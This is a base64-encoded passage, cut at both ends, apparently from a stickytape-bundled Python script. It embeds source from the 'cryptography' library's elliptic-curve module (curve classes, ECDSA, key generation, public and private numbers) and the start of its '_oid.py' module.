FQ1QyODNSMShFbGxpcHRpY0N1cnZlKTpcclxuICAgIG5hbWUgPSAic2VjdDI4M3IxIlxyXG4gICAga2V5X3NpemUgPSAyODNcclxuXHJcblxyXG5jbGFzcyBTRUNUMjMzUjEoRWxsaXB0aWNDdXJ2ZSk6XHJcbiAgICBuYW1lID0gInNlY3QyMzNyMSJcclxuICAgIGtleV9zaXplID0gMjMzXHJcblxyXG5cclxuY2xhc3MgU0VDVDE2M1IyKEVsbGlwdGljQ3VydmUpOlxyXG4gICAgbmFtZSA9ICJzZWN0MTYzcjIiXHJcbiAgICBrZXlfc2l6ZSA9IDE2M1xyXG5cclxuXHJcbmNsYXNzIFNFQ1Q1NzFLMShFbGxpcHRpY0N1cnZlKTpcclxuICAgIG5hbWUgPSAic2VjdDU3MWsxIlxyXG4gICAga2V5X3NpemUgPSA1NzFcclxuXHJcblxyXG5jbGFzcyBTRUNUNDA5SzEoRWxsaXB0aWNDdXJ2ZSk6XHJcbiAgICBuYW1lID0gInNlY3Q0MDlrMSJcclxuICAgIGtleV9zaXplID0gNDA5XHJcblxyXG5cclxuY2xhc3MgU0VDVDI4M0sxKEVsbGlwdGljQ3VydmUpOlxyXG4gICAgbmFtZSA9ICJzZWN0MjgzazEiXHJcbiAgICBrZXlfc2l6ZSA9IDI4M1xyXG5cclxuXHJcbmNsYXNzIFNFQ1QyMzNLMShFbGxpcHRpY0N1cnZlKTpcclxuICAgIG5hbWUgPSAic2VjdDIzM2sxIlxyXG4gICAga2V5X3NpemUgPSAyMzNcclxuXHJcblxyXG5jbGFzcyBTRUNUMTYzSzEoRWxsaXB0aWNDdXJ2ZSk6XHJcbiAgICBuYW1lID0gInNlY3QxNjNrMSJcclxuICAgIGtleV9zaXplID0gMTYzXHJcblxyXG5cclxuY2xhc3MgU0VDUDUyMVIxKEVsbGlwdGljQ3VydmUpOlxyXG4gICAgbmFtZSA9ICJzZWNwNTIxcjEiXHJcbiAgICBrZXlfc2l6ZSA9IDUyMVxyXG5cclxuXHJcbmNsYXNzIFNFQ1AzODRSMShFbGxpcHRpY0N1cnZlKTpcclxuICAgIG5hbWUgPSAic2VjcDM4NHIxIlxyXG4gICAga2V5X3NpemUgPSAzODRcclxuXHJcblxyXG5jbGFzcyBTRUNQMjU2UjEoRWxsaXB0aWNDdXJ2ZSk6XHJcbiAgICBuYW1lID0gInNlY3AyNTZyMSJcclxuICAgIGtleV9zaXplID0gMjU2XHJcblxyXG5cclxuY2xhc3MgU0VDUDI1NksxKEVsbGlwdGljQ3VydmUpOlxyXG4gICAgbmFtZSA9ICJzZWNwMjU2azEiXHJcbiAgICBrZXlfc2l6ZSA9IDI1NlxyXG5cclxuXHJcbmNsYXNzIFNFQ1AyMjRSMShFbGxpcHRpY0N1cnZlKTpcclxuICAgIG5hbWUgPSAic2VjcDIyNHIxIlxyXG4gICAga2V5X3NpemUgPSAyMjRcclxuXHJcblxyXG5jbGFzcyBTRUNQMTkyUjEoRWxsaXB0aWNDdXJ2ZSk6XHJcbiAgICBuYW1lID0gInNlY3AxOTJyMSJcclxuICAgIGtleV9zaXplID0gMTkyXHJcblxyXG5cclxuY2xhc3MgQnJhaW5wb29sUDI1NlIxKEVsbGlwdGljQ3VydmUpOlxyXG4gICAgbmFtZSA9ICJicmFpbnBvb2xQMjU2cjEiXHJcbiAgICBrZXlfc2l6ZSA9IDI1NlxyXG5cclxuXHJcbmNsYXNzIEJyYWlucG9vbFAzODRSMShFbGxpcHRpY0N1cnZlKTpcclxuICAgIG5hbWUgPSAiYnJhaW5wb29sUDM4NHIxIlxyXG4gICAga2V5X3NpemUgPSAzODRcclxuXHJcblxyXG5jbGFzcyBCcmFpbnBvb2xQNTEyUjEoRWxsaXB0aWNDdXJ2ZSk6XHJcbiAgICBuYW1lID0gImJyYWlucG9vbFA1MTJyMSJcclxuICAgIGtleV9zaXplID0gNTEyXHJcblxyXG5cclxuX0NVUlZFX1RZUEVTOiB0eXBpbmcuRGljdFtzdHIsIHR5cGluZy5UeXBlW0VsbGlwdGljQ3VydmVdXSA9IHtcclxuICAgICJwcmltZTE5MnYxIjogU0VDUDE5MlIxLFxyXG4gICAgInByaW1lMjU2djEiOiBTRUNQMjU2UjEsXHJcbiAgICAic2VjcDE5MnIxIjogU0VDUDE5MlIxLFxyXG4gICAgInNlY3AyMjRyMSI6IFNFQ1AyMjRSMSxcclxuICAgICJzZWNwMjU2cjEiOiBTRUNQMjU2UjEsXHJcbiAgICAic2VjcDM4NHIxIjogU0VDUDM4NFIxLFxyXG4gICAgInNlY3A1MjFyMSI6IFNFQ1A1MjFSMSxcclxuICAgICJzZWNwMjU2azEiOiBTRUNQMjU2SzEsXHJcbiAgICAic2VjdDE2M2sxIjogU0VDVDE2M0sxLFxyXG4gICAgInNlY3QyMzNrMSI6IFNFQ1QyMzNLMSxcclxuICAgICJzZWN0MjgzazEiOiBTRUNUMjgzSzEsXHJcbiAgICAic2VjdDQwOWsxIjogU0VDVDQwOUsxLFxyXG4gICAgInNlY3Q1NzFrMSI6IFNFQ1Q1NzFLMSxcclxuICAgICJzZWN0MTYzcjIiOiBTRUNUMTYzUjIsXHJcbiAgICAic2VjdDIzM3IxIjogU0VDVDIzM1IxLFxyXG4gICAgInNlY3QyODNyMSI6IFNFQ1QyODNSMSxcclxuICAgICJzZWN0NDA5cjEiOiBTRUNUNDA5UjEsXHJcbiAgICAic2VjdDU3MXIxIjogU0VDVDU3MVIxLFxyXG4gICAgImJyYWlucG9vbFAyNTZyMSI6IEJyYWlucG9vbFAyNTZSMSxcclxuICAgICJicmFpbnBvb2xQMzg0cjEiOiBCcmFpbnBvb2xQMzg0UjEsXHJcbiAgICAiYnJhaW5wb29sUDUxMnIxIjogQnJhaW5wb29sUDUxMlIxLFxyXG59XHJcblxyXG5cclxuY2xhc3MgRUNEU0EoRWxsaXB0aWNDdXJ2ZVNpZ25hdHVyZUFsZ29yaXRobSk6XHJcbiAgICBkZWYgX19pbml0X18oXHJcbiAgICAgICAgc2VsZixcclxuICAgICAgICBhbGdvcml0aG06IHR5cGluZy5Vbmlvblthc3ltX3V0aWxzLlByZWhhc2hlZCwgaGFzaGVzLkhhc2hBbGdvcml0aG1dLFxyXG4gICAgKTpcclxuICAgICAgICBzZWxmLl9hbGdvcml0aG0gPSBhbGdvcml0aG1cclxuXHJcbiAgICBAcHJvcGVydHlcclxuICAgIGRlZiBhbGdvcml0aG0oXHJcbiAgICAgICAgc2VsZixcclxuICAgICkgLT4gdHlwaW5nLlVuaW9uW2FzeW1fdXRpbHMuUHJlaGFzaGVkLCBoYXNoZXMuSGFzaEFsZ29yaXRobV06XHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX2FsZ29yaXRobVxyXG5cclxuXHJcbmRlZiBnZW5lcmF0ZV9wcml2YXRlX2tleShcclxuICAgIGN1cnZlOiBFbGxpcHRpY0N1cnZlLCBiYWNrZW5kOiB0eXBpbmcuQW55ID0gTm9uZVxyXG4pIC0+IEVsbGlwdGljQ3VydmVQcml2YXRlS2V5OlxyXG4gICAgZnJvbSBjcnlwdG9ncmFwaHkuaGF6bWF0LmJhY2tlbmRzLm9wZW5zc2wuYmFja2VuZCBpbXBvcnQgYmFja2VuZCBhcyBvc3NsXHJcblxyXG4gICAgcmV0dXJuIG9zc2wuZ2VuZXJhdGVfZWxsaXB0aWNfY3VydmVfcHJpdmF0ZV9rZXkoY3VydmUpXHJcblxyXG5cclxuZGVmIGRlcml2ZV9wcml2YXRlX2tleShcclxuICAgIHByaXZhdGVfdmFsdWU6IGludCxcclxuICAgIGN1cnZlOiBFbGxpcHRpY0N1cnZlLFxyXG4gICAgYmFja2VuZDogdHlwaW5nLkFueSA9IE5vbmUsXHJcbikgLT4gRWxsaXB0aWNDdXJ2ZVByaXZhdGVLZXk6XHJcbiAgICBmcm9tIGNyeXB0b2dyYXBoeS5oYXptYXQuYmFja2VuZHMub3BlbnNzbC5iYWNrZW5kIGltcG9ydCBiYWNrZW5kIGFzIG9zc2xcclxuXHJcbiAgICBpZiBub3QgaXNpbnN0YW5jZShwcml2YXRlX3ZhbHVlLCBpbnQpOlxyXG4gICAgICAgIHJhaXNlIFR5cGVFcnJvcigicHJpdmF0ZV92YWx1ZSBtdXN0IGJlIGFuIGludGVnZXIgdHlwZS4iKVxyXG5cclxuICAgIGlmIHByaXZhdGVfdmFsdWUgPD0gMDpcclxuICAgICAgICByYWlzZSBWYWx1ZUVycm9yKCJwcml2YXRlX3ZhbHVlIG11c3QgYmUgYSBwb3NpdGl2ZSBpbnRlZ2VyLiIpXHJcblxyXG4gICAgaWYgbm90IGlzaW5zdGFuY2UoY3VydmUsIEVsbGlwdGljQ3VydmUpOlxyXG4gICAgICAgIHJhaXNlIFR5cGVFcnJvcigiY3VydmUgbXVzdCBwcm92aWRlIHRoZSBFbGxpcHRpY0N1cnZlIGludGVyZmFjZS4iKVxyXG5cclxuICAgIHJldHVybiBvc3NsLmRlcml2ZV9lbGxpcHRpY19jdXJ2ZV9wcml2YXRlX2tleShwcml2YXRlX3ZhbHVlLCBjdXJ2ZSlcclxuXHJcblxyXG5jbGFzcyBFbGxpcHRpY0N1cnZlUHVibGljTnVtYmVyczpcclxuICAgIGRlZiBfX2luaXRfXyhzZWxmLCB4OiBpbnQsIHk6IGludCwgY3VydmU6IEVsbGlwdGljQ3VydmUpOlxyXG4gICAgICAgIGlmIG5vdCBpc2luc3RhbmNlKHgsIGludCkgb3Igbm90IGlzaW5zdGFuY2UoeSwgaW50KTpcclxuICAgICAgICAgICAgcmFpc2UgVHlwZUVycm9yKCJ4IGFuZCB5IG11c3QgYmUgaW50ZWdlcnMuIilcclxuXHJcbiAgICAgICAgaWYgbm90IGlzaW5zdGFuY2UoY3VydmUsIEVsbGlwdGljQ3VydmUpOlxyXG4gICAgICAgICAgICByYWlzZSBUeXBlRXJyb3IoImN1cnZlIG11c3QgcHJvdmlkZSB0aGUgRWxsaXB0aWNDdXJ2ZSBpbnRlcmZhY2UuIilcclxuXHJcbiAgICAgICAgc2VsZi5feSA9IHlcclxuICAgICAgICBzZWxmLl94ID0geFxyXG4gICAgICAgIHNlbGYuX2N1cnZlID0gY3VydmVcclxuXHJcbiAgICBkZWYgcHVibGljX2tleShzZWxmLCBiYWNrZW5kOiB0eXBpbmcuQW55ID0gTm9uZSkgLT4gRWxsaXB0aWNDdXJ2ZVB1YmxpY0tleTpcclxuICAgICAgICBmcm9tIGNyeXB0b2dyYXBoeS5oYXptYXQuYmFja2VuZHMub3BlbnNzbC5iYWNrZW5kIGltcG9ydCAoXHJcbiAgICAgICAgICAgIGJhY2tlbmQgYXMgb3NzbCxcclxuICAgICAgICApXHJcblxyXG4gICAgICAgIHJldHVybiBvc3NsLmxvYWRfZWxsaXB0aWNfY3VydmVfcHVibGljX251bWJlcnMoc2VsZilcclxuXHJcbiAgICBkZWYgZW5jb2RlX3BvaW50KHNlbGYpIC0+IGJ5dGVzOlxyXG4gICAgICAgIHdhcm5pbmdzLndhcm4oXHJcbiAgICAgICAgICAgICJlbmNvZGVfcG9pbnQgaGFzIGJlZW4gZGVwcmVjYXRlZCBvbiBFbGxpcHRpY0N1cnZlUHVibGljTnVtYmVycyJcclxuICAgICAgICAgICAgIiBhbmQgd2lsbCBiZSByZW1vdmVkIGluIGEgZnV0dXJlIHZlcnNpb24uIFBsZWFzZSB1c2UgIlxyXG4gICAgICAgICAgICAiRWxsaXB0aWNDdXJ2ZVB1YmxpY0tleS5wdWJsaWNfYnl0ZXMgdG8gb2J0YWluIGJvdGggIlxyXG4gICAgICAgICAgICAiY29tcHJlc3NlZCBhbmQgdW5jb21wcmVzc2VkIHBvaW50IGVuY29kaW5nLiIsXHJcbiAgICAgICAgICAgIHV0aWxzLlBlcnNpc3RlbnRseURlcHJlY2F0ZWQyMDE5LFxyXG4gICAgICAgICAgICBzdGFja2xldmVsPTIsXHJcbiAgICAgICAgKVxyXG4gICAgICAgICMga2V5X3NpemUgaXMgaW4gYml0cy4gQ29udmVydCB0byBieXRlcyBhbmQgcm91bmQgdXBcclxuICAgICAgICBieXRlX2xlbmd0aCA9IChzZWxmLmN1cnZlLmtleV9zaXplICsgNykgLy8gOFxyXG4gICAgICAgIHJldHVybiAoXHJcbiAgICAgICAgICAgIGIiXFx4MDQiXHJcbiAgICAgICAgICAgICsgdXRpbHMuaW50X3RvX2J5dGVzKHNlbGYueCwgYnl0ZV9sZW5ndGgpXHJcbiAgICAgICAgICAgICsgdXRpbHMuaW50X3RvX2J5dGVzKHNlbGYueSwgYnl0ZV9sZW5ndGgpXHJcbiAgICAgICAgKVxyXG5cclxuICAgIEBjbGFzc21ldGhvZFxyXG4gICAgZGVmIGZyb21fZW5jb2RlZF9wb2ludChcclxuICAgICAgICBjbHMsIGN1cnZlOiBFbGxpcHRpY0N1cnZlLCBkYXRhOiBieXRlc1xyXG4gICAgKSAtPiAiRWxsaXB0aWNDdXJ2ZVB1YmxpY051bWJlcnMiOlxyXG4gICAgICAgIGlmIG5vdCBpc2luc3RhbmNlKGN1cnZlLCBFbGxpcHRpY0N1cnZlKTpcclxuICAgICAgICAgICAgcmFpc2UgVHlwZUVycm9yKCJjdXJ2ZSBtdXN0IGJlIGFuIEVsbGlwdGljQ3VydmUgaW5zdGFuY2UiKVxyXG5cclxuICAgICAgICB3YXJuaW5ncy53YXJuKFxyXG4gICAgICAgICAgICAiU3VwcG9ydCBmb3IgdW5zYWZlIGNvbnN0cnVjdGlvbiBvZiBwdWJsaWMgbnVtYmVycyBmcm9tICJcclxuICAgICAgICAgICAgImVuY29kZWQgZGF0YSB3aWxsIGJlIHJlbW92ZWQgaW4gYSBmdXR1cmUgdmVyc2lvbi4gIlxyXG4gICAgICAgICAgICAiUGxlYXNlIHVzZSBFbGxpcHRpY0N1cnZlUHVibGljS2V5LmZyb21fZW5jb2RlZF9wb2ludCIsXHJcbiAgICAgICAgICAgIHV0aWxzLlBlcnNpc3RlbnRseURlcHJlY2F0ZWQyMDE5LFxyXG4gICAgICAgICAgICBzdGFja2xldmVsPTIsXHJcbiAgICAgICAgKVxyXG5cclxuICAgICAgICBpZiBkYXRhLnN0YXJ0c3dpdGgoYiJcXHgwNCIpOlxyXG4gICAgICAgICAgICAjIGtleV9zaXplIGlzIGluIGJpdHMuIENvbnZlcnQgdG8gYnl0ZXMgYW5kIHJvdW5kIHVwXHJcbiAgICAgICAgICAgIGJ5dGVfbGVuZ3RoID0gKGN1cnZlLmtleV9zaXplICsgNykgLy8gOFxyXG4gICAgICAgICAgICBpZiBsZW4oZGF0YSkgPT0gMiAqIGJ5dGVfbGVuZ3RoICsgMTpcclxuICAgICAgICAgICAgICAgIHggPSBpbnQuZnJvbV9ieXRlcyhkYXRhWzEgOiBieXRlX2xlbmd0aCArIDFdLCAiYmlnIilcclxuICAgICAgICAgICAgICAgIHkgPSBpbnQuZnJvbV9ieXRlcyhkYXRhW2J5dGVfbGVuZ3RoICsgMSA6XSwgImJpZyIpXHJcbiAgICAgICAgICAgICAgICByZXR1cm4gY2xzKHgsIHksIGN1cnZlKVxyXG4gICAgICAgICAgICBlbHNlOlxyXG4gICAgICAgICAgICAgICAgcmFpc2UgVmFsdWVFcnJvcigiSW52YWxpZCBlbGxpcHRpYyBjdXJ2ZSBwb2ludCBkYXRhIGxlbmd0aCIpXHJcbiAgICAgICAgZWxzZTpcclxuICAgICAgICAgICAgcmFpc2UgVmFsdWVFcnJvcigiVW5zdXBwb3J0ZWQgZWxsaXB0aWMgY3VydmUgcG9pbnQgdHlwZSIpXHJcblxyXG4gICAgQHByb3BlcnR5XHJcbiAgICBkZWYgY3VydmUoc2VsZikgLT4gRWxsaXB0aWNDdXJ2ZTpcclxuICAgICAgICByZXR1cm4gc2VsZi5fY3VydmVcclxuXHJcbiAgICBAcHJvcGVydHlcclxuICAgIGRlZiB4KHNlbGYpIC0+IGludDpcclxuICAgICAgICByZXR1cm4gc2VsZi5feFxyXG5cclxuICAgIEBwcm9wZXJ0eVxyXG4gICAgZGVmIHkoc2VsZikgLT4gaW50OlxyXG4gICAgICAgIHJldHVybiBzZWxmLl95XHJcblxyXG4gICAgZGVmIF9fZXFfXyhzZWxmLCBvdGhlcjogb2JqZWN0KSAtPiBib29sOlxyXG4gICAgICAgIGlmIG5vdCBpc2luc3RhbmNlKG90aGVyLCBFbGxpcHRpY0N1cnZlUHVibGljTnVtYmVycyk6XHJcbiAgICAgICAgICAgIHJldHVybiBOb3RJbXBsZW1lbnRlZFxyXG5cclxuICAgICAgICByZXR1cm4gKFxyXG4gICAgICAgICAgICBzZWxmLnggPT0gb3RoZXIueFxyXG4gICAgICAgICAgICBhbmQgc2VsZi55ID09IG90aGVyLnlcclxuICAgICAgICAgICAgYW5kIHNlbGYuY3VydmUubmFtZSA9PSBvdGhlci5jdXJ2ZS5uYW1lXHJcbiAgICAgICAgICAgIGFuZCBzZWxmLmN1cnZlLmtleV9zaXplID09IG90aGVyLmN1cnZlLmtleV9zaXplXHJcbiAgICAgICAgKVxyXG5cclxuICAgIGRlZiBfX2hhc2hfXyhzZWxmKSAtPiBpbnQ6XHJcbiAgICAgICAgcmV0dXJuIGhhc2goKHNlbGYueCwgc2VsZi55LCBzZWxmLmN1cnZlLm5hbWUsIHNlbGYuY3VydmUua2V5X3NpemUpKVxyXG5cclxuICAgIGRlZiBfX3JlcHJfXyhzZWxmKSAtPiBzdHI6XHJcbiAgICAgICAgcmV0dXJuIChcclxuICAgICAgICAgICAgIjxFbGxpcHRpY0N1cnZlUHVibGljTnVtYmVycyhjdXJ2ZT17MC5jdXJ2ZS5uYW1lfSwgeD17MC54fSwgIlxyXG4gICAgICAgICAgICAieT17MC55fT4iLmZvcm1hdChzZWxmKVxyXG4gICAgICAgIClcclxuXHJcblxyXG5jbGFzcyBFbGxpcHRpY0N1cnZlUHJpdmF0ZU51bWJlcnM6XHJcbiAgICBkZWYgX19pbml0X18oXHJcbiAgICAgICAgc2VsZiwgcHJpdmF0ZV92YWx1ZTogaW50LCBwdWJsaWNfbnVtYmVyczogRWxsaXB0aWNDdXJ2ZVB1YmxpY051bWJlcnNcclxuICAgICk6XHJcbiAgICAgICAgaWYgbm90IGlzaW5zdGFuY2UocHJpdmF0ZV92YWx1ZSwgaW50KTpcclxuICAgICAgICAgICAgcmFpc2UgVHlwZUVycm9yKCJwcml2YXRlX3ZhbHVlIG11c3QgYmUgYW4gaW50ZWdlci4iKVxyXG5cclxuICAgICAgICBpZiBub3QgaXNpbnN0YW5jZShwdWJsaWNfbnVtYmVycywgRWxsaXB0aWNDdXJ2ZVB1YmxpY051bWJlcnMpOlxyXG4gICAgICAgICAgICByYWlzZSBUeXBlRXJyb3IoXHJcbiAgICAgICAgICAgICAgICAicHVibGljX251bWJlcnMgbXVzdCBiZSBhbiBFbGxpcHRpY0N1cnZlUHVibGljTnVtYmVycyAiXHJcbiAgICAgICAgICAgICAgICAiaW5zdGFuY2UuIlxyXG4gICAgICAgICAgICApXHJcblxyXG4gICAgICAgIHNlbGYuX3ByaXZhdGVfdmFsdWUgPSBwcml2YXRlX3ZhbHVlXHJcbiAgICAgICAgc2VsZi5fcHVibGljX251bWJlcnMgPSBwdWJsaWNfbnVtYmVyc1xyXG5cclxuICAgIGRlZiBwcml2YXRlX2tleShcclxuICAgICAgICBzZWxmLCBiYWNrZW5kOiB0eXBpbmcuQW55ID0gTm9uZVxyXG4gICAgKSAtPiBFbGxpcHRpY0N1cnZlUHJpdmF0ZUtleTpcclxuICAgICAgICBmcm9tIGNyeXB0b2dyYXBoeS5oYXptYXQuYmFja2VuZHMub3BlbnNzbC5iYWNrZW5kIGltcG9ydCAoXHJcbiAgICAgICAgICAgIGJhY2tlbmQgYXMgb3NzbCxcclxuICAgICAgICApXHJcblxyXG4gICAgICAgIHJldHVybiBvc3NsLmxvYWRfZWxsaXB0aWNfY3VydmVfcHJpdmF0ZV9udW1iZXJzKHNlbGYpXHJcblxyXG4gICAgQHByb3BlcnR5XHJcbiAgICBkZWYgcHJpdmF0ZV92YWx1ZShzZWxmKSAtPiBpbnQ6XHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX3ByaXZhdGVfdmFsdWVcclxuXHJcbiAgICBAcHJvcGVydHlcclxuICAgIGRlZiBwdWJsaWNfbnVtYmVycyhzZWxmKSAtPiBFbGxpcHRpY0N1cnZlUHVibGljTnVtYmVyczpcclxuICAgICAgICByZXR1cm4gc2VsZi5fcHVibGljX251bWJlcnNcclxuXHJcbiAgICBkZWYgX19lcV9fKHNlbGYsIG90aGVyOiBvYmplY3QpIC0+IGJvb2w6XHJcbiAgICAgICAgaWYgbm90IGlzaW5zdGFuY2Uob3RoZXIsIEVsbGlwdGljQ3VydmVQcml2YXRlTnVtYmVycyk6XHJcbiAgICAgICAgICAgIHJldHVybiBOb3RJbXBsZW1lbnRlZFxyXG5cclxuICAgICAgICByZXR1cm4gKFxyXG4gICAgICAgICAgICBzZWxmLnByaXZhdGVfdmFsdWUgPT0gb3RoZXIucHJpdmF0ZV92YWx1ZVxyXG4gICAgICAgICAgICBhbmQgc2VsZi5wdWJsaWNfbnVtYmVycyA9PSBvdGhlci5wdWJsaWNfbnVtYmVyc1xyXG4gICAgICAgIClcclxuXHJcbiAgICBkZWYgX19oYXNoX18oc2VsZikgLT4gaW50OlxyXG4gICAgICAgIHJldHVybiBoYXNoKChzZWxmLnByaXZhdGVfdmFsdWUsIHNlbGYucHVibGljX251bWJlcnMpKVxyXG5cclxuXHJcbmNsYXNzIEVDREg6XHJcbiAgICBwYXNzXHJcblxyXG5cclxuX09JRF9UT19DVVJWRSA9IHtcclxuICAgIEVsbGlwdGljQ3VydmVPSUQuU0VDUDE5MlIxOiBTRUNQMTkyUjEsXHJcbiAgICBFbGxpcHRpY0N1cnZlT0lELlNFQ1AyMjRSMTogU0VDUDIyNFIxLFxyXG4gICAgRWxsaXB0aWNDdXJ2ZU9JRC5TRUNQMjU2SzE6IFNFQ1AyNTZLMSxcclxuICAgIEVsbGlwdGljQ3VydmVPSUQuU0VDUDI1NlIxOiBTRUNQMjU2UjEsXHJcbiAgICBFbGxpcHRpY0N1cnZlT0lELlNFQ1AzODRSMTogU0VDUDM4NFIxLFxyXG4gICAgRWxsaXB0aWNDdXJ2ZU9JRC5TRUNQNTIxUjE6IFNFQ1A1MjFSMSxcclxuICAgIEVsbGlwdGljQ3VydmVPSUQuQlJBSU5QT09MUDI1NlIxOiBCcmFpbnBvb2xQMjU2UjEsXHJcbiAgICBFbGxpcHRpY0N1cnZlT0lELkJSQUlOUE9PTFAzODRSMTogQnJhaW5wb29sUDM4NFIxLFxyXG4gICAgRWxsaXB0aWNDdXJ2ZU9JRC5CUkFJTlBPT0xQNTEyUjE6IEJyYWlucG9vbFA1MTJSMSxcclxuICAgIEVsbGlwdGljQ3VydmVPSUQuU0VDVDE2M0sxOiBTRUNUMTYzSzEsXHJcbiAgICBFbGxpcHRpY0N1cnZlT0lELlNFQ1QxNjNSMjogU0VDVDE2M1IyLFxyXG4gICAgRWxsaXB0aWNDdXJ2ZU9JRC5TRUNUMjMzSzE6IFNFQ1QyMzNLMSxcclxuICAgIEVsbGlwdGljQ3VydmVPSUQuU0VDVDIzM1IxOiBTRUNUMjMzUjEsXHJcbiAgICBFbGxpcHRpY0N1cnZlT0lELlNFQ1QyODNLMTogU0VDVDI4M0sxLFxyXG4gICAgRWxsaXB0aWNDdXJ2ZU9JRC5TRUNUMjgzUjE6IFNFQ1QyODNSMSxcclxuICAgIEVsbGlwdGljQ3VydmVPSUQuU0VDVDQwOUsxOiBTRUNUNDA5SzEsXHJcbiAgICBFbGxpcHRpY0N1cnZlT0lELlNFQ1Q0MDlSMTogU0VDVDQwOVIxLFxyXG4gICAgRWxsaXB0aWNDdXJ2ZU9JRC5TRUNUNTcxSzE6IFNFQ1Q1NzFLMSxcclxuICAgIEVsbGlwdGljQ3VydmVPSUQuU0VDVDU3MVIxOiBTRUNUNTcxUjEsXHJcbn1cclxuXHJcblxyXG5kZWYgZ2V0X2N1cnZlX2Zvcl9vaWQob2lkOiBPYmplY3RJZGVudGlmaWVyKSAtPiB0eXBpbmcuVHlwZVtFbGxpcHRpY0N1cnZlXTpcclxuICAgIHRyeTpcclxuICAgICAgICByZXR1cm4gX09JRF9UT19DVVJWRVtvaWRdXHJcbiAgICBleGNlcHQgS2V5RXJyb3I6XHJcbiAgICAgICAgcmFpc2UgTG9va3VwRXJyb3IoXHJcbiAgICAgICAgICAgICJUaGUgcHJvdmlkZWQgb2JqZWN0IGlkZW50aWZpZXIgaGFzIG5vIG1hdGNoaW5nIGVsbGlwdGljICJcclxuICAgICAgICAgICAgImN1cnZlIGNsYXNzIlxyXG4gICAgICAgIClcclxuJykKICAgIF9fc3RpY2t5dGFwZV93cml0ZV9tb2R1bGUoJ2NyeXB0b2dyYXBoeS9oYXptYXQvX29pZC5weScsIGInIyBUaGlzIGZpbGUgaXMgZHVhbCBsaWNlbnNlZCB1bmRlciB0aGUgdGVybXMgb2YgdGhlIEFwYWNoZSBMaWNlbnNlLCBWZXJzaW9uXHJcbiMgMi4wLCBhbmQgdGhlIEJTRCBMaWNlbnNlLiBTZWUgdGhlIExJQ0VOU0UgZmlsZSBpbiB0aGUgcm9vdCBvZiB0aGlzIHJlcG9zaXRvcnlcclxuIyBmb3IgY29tcGxldGUgZGV0YWlscy5cclxuXHJcbmltcG9ydCB0eXBpbmdcclxuXHJcbmZyb20gY3J5cHRvZ3JhcGh5Lmhhem1hdC5wcmltaXRpdmVzIGltcG9ydCBoYXNoZXNcclxuXHJcblxyXG5jbGFzcyBPYmplY3RJZGVudGlmaWVyOlxyXG4gICAgZGVmIF9faW5pdF9fKHNlbGYsIGRvdHRlZF9zdHJpbmc6IHN0cikgLT4gTm9uZTpcclxuICAgICAgICBzZWxmLl9kb3R0ZWRfc3RyaW5nID0gZG90dGVkX3N0cmluZ1xyXG5cclxuICAgICAgICBub2RlcyA9IHNlbGYuX2RvdHRlZF9zdHJpbmcuc3BsaXQoIi4iKVxyXG4gICAgICAgIGludG5vZGVzID0gW11cclxuXHJcbiAgICAgICAgIyBUaGVyZSBtdXN0IGJlIGF0IGxlYXN0IDIgbm9kZXMsIHRoZSBmaXJzdCBub2RlIG11c3QgYmUgMC4uMiwgYW5kXHJcbiAgICAgICAgIyBpZiBsZXNzIHRoYW4gMiwgdGhlIHNlY29uZCBub2RlIGNhbm5vdCBoYXZlIGEgdmFsdWUgb3V0c2lkZSB0aGVcclxuICAgICAgICAjIHJhbmdlIDAuLjM5LiAgQWxsIG5vZGVzIG11c3QgYmUgaW50ZWdlcnMuXHJcbiAgICAgICAgZm9yIG5vZGUgaW4gbm9kZXM6XHJcbiAgICAgICAgICAgIHRyeTpcclxuICAgICAgICAgICAgICAgIG5vZGVfdmFsdWUgPSBpbnQobm9kZSwgMTApXHJcbiAgICAgICAgICAgIGV4Y2VwdCBWYWx1ZUVycm9yOlxyXG4gICAgICAgICAgICAgICAgcmFpc2UgVmFsdWVFcnJvcihcclxuICAgICAgICAgICAgICAgICAgICBmIk1hbGZvcm1lZCBPSUQ6IHtkb3R0ZWRfc3RyaW5nfSAobm9uLWludGVnZXIgbm9kZXMpIlxyXG4gICAgICAgICAgICAgICAgKVxyXG4gICAgICAgICAgICBpZiBub2RlX3ZhbHVlIDwgMDpcclxuICAgICAgICAgICAgICAgIHJhaXNlIFZhbHVlRXJyb3IoXHJcbiAgICAgICAgICAgICAgICAgICAgZiJNYWxmb3JtZWQgT0lEOiB7ZG90dGVkX3N0cmluZ30gKG5lZ2F0aXZlLWludGVnZXIgbm9kZXMpIlxyXG4gICAgICAgICAgICAgICAgKVxyXG4gICAgICAgICAgICBpbnRub2Rlcy5hcHBlbmQobm9kZV92YWx1ZSlcclxuXHJcbiAgICAgICAgaWYgbGVuKG5vZGVzKSA8IDI6XHJcbiAgICAgICAgICAgIHJhaXNlIFZhbHVlRXJyb3IoXHJcbiAgICAgICAgICAgICAgICBmIk1hbGZvcm1lZCBPSUQ6IHtkb3R0ZWRfc3RyaW5nfSAiXHJcbiAgICAgICAgICAgICAgICAiKGluc3VmZmljaWVudCBudW1iZXIgb2Ygbm9kZXMpIlxyXG4gICAgICAgICAgICApXHJcblxyXG4gICAgICAgIGlmIGludG5vZGVzWzBdID4gMjpcclxuICAgICAgICAgICAgcmFpc2UgVmFsdWVFcnJvcihcclxuICAgICAgICAgICAgICAgIGYiTWFsZm9ybWVkIE9JRDoge2RvdHRlZF9zdHJpbmd9ICJcclxuICAgICAgICAgICAgICAgICIoZmlyc3Qgbm9kZSBvdXRzaWRlIHZhbGlkIHJhbmdlKSJcclxuICAgICAgICAgICAgKVxyXG5cclxuICAgICAgICBpZiBpbnRub2Rlc1swXSA8IDIgYW5kIGludG5vZGVzWzFdID49IDQwOlxyXG4gICAgICAgICAgICByYWlzZSBWYWx1ZUVycm9yKFxyXG4gICAgICAgICAgICAgICAgZiJNYWxmb3JtZWQgT0lEOiB7ZG90dGVkX3N0cmluZ30gIlxyXG4gICAgICAgICAgICAgICAgIihzZWNvbmQgbm9kZSBvdXRzaWRlIHZhbGlkIHJhbmdlKSJcclxuICAgICAgICAgICAgKVxyXG5cclxuICAgIGRlZiBfX2VxX18oc2VsZiwgb3RoZXI6IG9iamVjdCkgLT4gYm9vbDpcclxuICAgICAgICBpZiBub3QgaXNpbnN0YW5jZShvdGhlciwgT2JqZWN0SWRlbnRpZmllcik6XHJcbiAgICAgICAgICAgIHJldHVybiBOb3RJbXBsZW1lbnRlZFxyXG5cclxuICAgICAgICByZXR1cm4gc2VsZi5kb3R0ZWRfc3RyaW5nID09IG90aGVyLmRvdHRlZF9zdHJpbmdcclxuXHJcbiAg